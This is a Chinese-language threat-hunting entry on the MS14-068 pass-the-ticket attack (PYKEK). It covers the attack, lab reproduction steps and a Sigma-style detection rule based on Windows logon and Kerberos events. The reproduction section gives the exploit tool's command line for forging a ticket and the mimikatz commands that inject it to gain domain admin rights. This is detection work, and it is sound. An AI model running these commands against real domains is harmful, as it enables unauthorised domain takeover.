# T1097-windows-MS14-068-PYKEK

## 来自ATT&CK的描述

票据传递攻击（PtT）是一种不访问账号密码而使用Kerberos凭据对用户进行身份认证的方法。Kerberos身份认证可以是横向移动到远程系统的第一步。

在使用PtT技术时，可通过凭据导出技术获取有效账号的Kerberos票据。PtT可能会获取到用户的服务票据或票据授予票据（TGT），具体取决于访问级别。服务票据允许访问特定资源，而TGT可用于从票据授予服务（TGS）请求服务票据，用来访问用户有权访问的任何资源。

PtT技术可以为使用Kerberos作为身份认证机制的服务获取白银票据，并用于生成票据来访问特定资源和承载该资源的系统（例如，SharePoint）。

PtT技术还可以使用密钥分发服务账号KRBTGT帐户NTLM哈希来获得域的黄金票据，从而为活动目录中的任一账号生成TGT。

## 测试案例

可参考：[内网渗透之PTH&PTT&PTK](https://www.bbsmax.com/A/A7zgkjRPz4/)

## 检测日志

windows 安全日志（AD域控日志）

## 测试复现

测试步骤

域控主机（Windows server 2008）
域内主机（Windows 7 SP1）

```cmd
whoami /user #域内主机查找当前用户SID
dir \\DC\C$  #查看访问DC的权限
ms14-.exe -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码 #域机器是可以和域控制器互通则会创建.ccache文件
```

票据注入

```cmd
mimikatz # kerberos::purge         //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造
mimikatz # kerberos::list          //查看当前机器凭证
mimikatz # kerberos::ptc 票据文件   //将票据注入到内存中
```

使用mimikatz将票据注入到当前内存中，伪造凭证，如果成功则拥有域管理权限，可任意访问域中所有机器

## 测试留痕

测试留痕文件：[MS14-068-PYKEK-windows.log](https://github.com/12306Bro/Threathunting-book/tree/master/Eventdata/MS14-068/PYKEK)

## 检测规则/思路

```yml
title: MS14-068-PYKEK
description: windows server 2008 / windows 7
references: https://github.com/ThreatHuntingProject/ThreatHunting/blob/master/hunts/golden_ticket.md
tags: T1097
status: experimental
author: 12306Bro
logsource:
    product: windows
    service: Security
detection:
    selection1:
        EventID: 4624 #账户登录
        Account Domain: '*.*' #新登录>账户域(正常情况下，账户域应为ABC，当存在PYKEK攻击时，账户域为ABC.COM)
        Account Name: '*' #新登录>账户名(不同于安全标识的帐户，此条件实现起来较为复杂)
    selection2:
        EventID: 4672 #管理员登录
        Account Domain: '*.*' #账户域(正常情况下，账户域应为ABC，当存在PYKEK攻击时，账户域为ABC.COM)
    selection3:
        EventID: 4768 #Kerberos TGS请求
        Supplied Realm Name: '*.*' #已提供的领域名称(正常情况下，已提供的领域名称应为ABC，当存在PYKEK攻击时，已提供的领域名称为ABC.COM)
    timeframe: last 5s
    condition: all of them
level: medium
```

## 参考推荐

MITRE-ATT&CK-T1097：<https://attack.mitre.org/techniques/T1097/>

内网渗透之PTH&PTT&PTK：<https://www.bbsmax.com/A/A7zgkjRPz4/>
